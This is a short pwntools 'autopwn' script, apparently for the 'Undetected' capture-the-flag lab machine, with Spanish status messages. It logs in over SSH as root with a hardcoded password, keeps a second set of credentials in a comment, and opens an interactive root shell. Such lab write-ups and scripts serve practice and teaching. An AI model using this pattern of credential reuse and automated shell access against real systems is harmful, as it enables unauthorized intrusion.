try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Undetected ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

request = ssh(host='Undetected', user='root', password='@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3')
#request = ssh(host='Undetected', user='steven1', password='ihatehackers')
shell = request.process("/bin/sh")
shell.interactive()
